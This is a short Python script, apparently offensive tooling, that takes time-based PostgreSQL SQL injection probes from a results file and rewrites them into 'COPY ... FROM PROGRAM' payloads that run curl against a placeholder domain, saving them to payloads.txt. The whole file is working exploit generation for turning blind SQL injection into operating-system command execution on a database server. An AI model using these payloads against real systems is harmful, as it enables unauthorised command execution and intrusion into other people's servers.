domain = "http://subdomain.domain.tld/"
payload = f"COPY trigger_test (command_output) FROM PROGRAM 'curl {domain}';"

a = []
file = "payloads.txt"

open(file, "w")

for line in open("res.txt"):
    if "PG_SLEEP(" in line.strip():
        a.append(line.strip())
        open(file, "a").write(line.strip().replace("PG_SLEEP(5)", payload).replace("qhjhjk", "")
                                         .replace("SELECT ", "") + "\n")
        # .replace("\"", r"\"")
